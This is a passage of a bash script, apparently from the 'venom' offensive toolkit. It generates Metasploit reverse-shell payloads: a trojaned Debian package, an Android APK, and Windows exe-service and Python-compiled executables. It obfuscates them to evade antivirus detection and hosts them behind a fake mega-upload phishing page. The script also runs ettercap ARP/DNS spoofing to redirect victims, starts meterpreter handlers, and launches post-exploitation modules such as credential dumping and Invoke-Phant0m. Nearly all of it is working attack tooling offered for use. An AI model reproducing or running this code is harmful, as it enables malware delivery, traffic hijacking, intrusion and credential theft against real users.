            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $filename-$srvhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$srvhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $filename-$srvhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$filename.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
fi
}





# ----------------------------------------
# kimi - Malicious Debian Packet Creator
# author: Chaitanya Haritash (SSA-RedTeam)
# ----------------------------------------
sh_shellcode20 () {
# get user input to build the payload
echo "[☠] Enter shellcode settings!"
srvhost=$(zenity --title="☠ Enter SRVHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: theMinotaur" --width 300) > /dev/null 2>&1
VeRp=$(zenity --entry --title "☠ DEBIAN PACKET VERSION ☠" --text "example: 1.0.13" --width 300) > /dev/null 2>&1


# display final settings to user
cat << !

 shellcode settings
+-------------------------------
| SRVPORT : 8080
| SRVHOST : $srvhost
| FORMAT  : SH,PYTHON -> UNIX(s)
| PAYLOAD : python/meterpreter/reverse_tcp
|_AGENT   : $IPATH/output/$N4m.deb

!


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files .."
sleep 2


   # check if kimi.py exists
   if [ -e $IPATH/templates/kimi_MDPC/kimi.py ]; then
      echo "[☠] MDPC-kimi.py -> found!"
      sleep 2
 
   else

      echo "[☠] MDPC-kimi.py -> not found!"
      exit
   fi


# use MDPC to build trojan agent
echo "[☠] Use MDPC-kimi to build agent .."
sleep 2
cd $IPATH/templates/kimi_MDPC
xterm -T "kimi.py (MDPC)" -geometry 110x23 -e "python kimi.py -n $N4m -V $VeRp -l $srvhost && sleep 2" > /dev/null 2>&1
# move agent to the rigth directory (venom)
echo "[☠] Moving agent to output folder .."
sleep 2
mv *.deb $IPATH/output/$N4m.deb > /dev/null 2>&1
mv handler.rc $IPATH/output/handler.rc > /dev/null 2>&1
cd $IPATH/


# copy agent to apache2 and deliver it to target
echo "[☠] Execute in target: sudo dpkg -i $N4m.deb"
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.deb\n\nchose how to deliver: $N4m.deb" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc"
      sleep 2

   else

      # edit files nedded
      echo "[☠] copy files to webroot..."
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.deb|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.deb $ApAcHe/$N4m.deb > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.deb|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.deb $ApAcHe/$N4m.deb
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"



        else


        echo "- ATTACK VECTOR: http://$srvhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc"

        fi
   fi



sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.deb > /dev/null 2>&1
clear
cd $IPATH/
# limpar /usr/local/bin in target on exit
# rm /usr/local/bin/$N4m > /dev/null 2>&1
}





# -----------------------------
# Android payload 
# ----------------------------- 
sh_shellcode21 () {

# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1


echo "[☠] Building shellcode -> DALVIK format ..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : DALVIK -> ANDROID
|_PAYLOAD : android/meterpreter/reverse_tcp


!

# use metasploit to build shellcode (msf encoded)
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a dalvik --platform Android -f raw > $IPATH/output/$N4m.apk"
sleep 2



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.apk\n\nchose how to deliver: $N4m.apk" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
        fi
      sleep 2

   else

      # edit files nedded
      echo "[☠] copy files to webroot..."
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.apk|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.apk $ApAcHe/$N4m.apk > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.apk|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.apk $ApAcHe/$N4m.apk
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
          fi
        fi
   fi



sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.apk > /dev/null 2>&1
clear
cd $IPATH/
}







# -----------------------------------------------------
# build shellcode in EXE format (windows-platforms)
# to deploy againts windows service (exe-service)
# ------------------------------------------------------
sh_shellcode22 () {
# module description
cat << !

    ╔─────────────────────────────────────────────────────────────╗
    |    This module builds exe-service payloads to be deployed   |
    |  onto windows_service_control_manager(SCM) service-payload  |
    |  Auxiliary module: venom-main/aux/deploy_service_payload.rb |
    ╚─────────────────────────────────────────────────────────────╝

!
sleep 2
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: Program" --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1

echo "[☠] Building shellcode -> exe-service format ..."
sleep 2
echo "[☠] obfuscating -> msf encoders!"
sleep 2
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : EXE-SERVICE -> WINDOWS(SCM)
|_PAYLOAD : $paylo


!

# use metasploit to build shellcode (msf encoded)
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/countdown -i 8 -f raw | msfvenom --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom --platform windows -e x86/shikata_ga_nai -i 9 -f exe-service > $IPATH/output/$N4m.exe"



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 320) > /dev/null 2>&1


  if [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


else


  echo "[x] Abort execution .."
  sleep 2
fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}




# -----------------------------------------------------
# C - PYTHON to EXE shellcode (SSL/TLS eavesdrop)
# ------------------------------------------------------
sh_shellcode23 () {
# module description
cat << !

    ╔─────────────────────────────────────────────────────────────╗
    | This module uses reverse_https payloads and gmail pem cert  |
    | to prevent session data beeing eavesdrop by 3º party actors |
    |  It also uses random UUID keys to evade signature detection |
    |                                                             |
    |  Detection ratio:                                           |
    |  https://nodistribute.com/result/LDynoZOq9A5TeBMYFW4k       |
    ╚─────────────────────────────────────────────────────────────╝

!
sleep 2
# run module or abort ? 
QuE=$(zenity --question --title="☠ UUID random keys evasion ☠" --text "Author: r00t-3xp10it/null-byte\nRun uuid module?" --width 240) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 260) > /dev/null 2>&1

echo "[☠] Building shellcode -> C,SSL/TLS format .."
sleep 2
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : C,SSL/TLS -> WINDOWS(EXE)
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode (msf encoded)
# https://nodistribute.com/result/0DGFYgWdtaKuv8NzMiqAwJIQfmBy (2/39) py raw
# https://nodistribute.com/result/BunD148C79GOQkxj0g2deHqI (3/39) py exe
# https://nodistribute.com/result/LDynoZOq9A5TeBMYFW4k (2/39) nullbite obfuscation
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport PayloadUUIDTracking=true HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --smallest -f c | tr -d '\"' | tr -d '\n' | more > $IPATH/output/chars.raw"


echo ""
# strip bad caracters and store shellcode 
store=`cat $IPATH/output/chars.raw | awk {'print $5'} | cut -d ';' -f1`
# display generated code
cat $IPATH/output/chars.raw
echo "" && echo "" && echo ""
sleep 2


   # check if chars.raw as generated
   if [ -e "$IPATH/output/chars.raw" ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
echo "[☠] editing/backup files..."

#
# Template ramdom keys ..
# HINT: adding ramdom comments to source code
# will help evading AVs signature detection (nullbite) 
# "a computer can never outsmart a always changing virus" 
#
NEW_UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
#
# pyinstalle does not accept numbers in funtion names (compiling), so we use only leters ..
#
NEW_UUID_4=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 10 | head -n 1)
NEW_UUID_5=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 11 | head -n 1)
NEW_UUID_6=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 12 | head -n 1)


#
# Build python Template (random UUID keys)
#
cd $IPATH/output
echo "[☠] build -> template.py"
sleep 1
echo "[✔] Using random UUID keys (evade signature detection)"
sleep 1
echo "#!/usr/bin/python" > template.py
echo "# -*- coding: utf-8 -*-" >> template.py
echo "import win32api, win32con" >> template.py
echo "# $NEW_UUID_1" >> template.py
echo "import win32event, winerror" >> template.py
echo "# $NEW_UUID_2" >> template.py
echo "from ctypes import *" >> template.py
echo "# $NEW_UUID_3" >> template.py
echo "$NEW_UUID_4 = (\"$store\");" >> template.py
echo "# gdGtdfASsTmFFsGbaaUnaDtaAvAaTkDKsHFdtGaAGmDoTkEkoT" >> template.py
echo "$NEW_UUID_5 = create_string_buffer($NEW_UUID_4, len($NEW_UUID_4))" >> template.py
echo "# GSMsdMfhmDjkGjDhMhhMfdsAsasAffWgUkhWWjWjGfdOgEEjue" >> template.py
echo "$NEW_UUID_6 = cast($NEW_UUID_5, CFUNCTYPE(c_void_p))" >> template.py
echo "# HdFDgFDttPkSMcSsFSKaWdBfDBmkSkOSiBewSDoFtLmDeWsKvG" >> template.py
echo "$NEW_UUID_6()" >> template.py
sleep 2

     # check if pyinstaller its installed
     if [ -d $DrIvC/$PiWiN ]; then
       # compile python to exe
       echo "[☠] pyinstaller -> found!"
       sleep 2
       echo "[☠] compile template.py -> $N4m.exe"
       sleep 2
       cd $IPATH/output

# chose executable final icon (.ico)
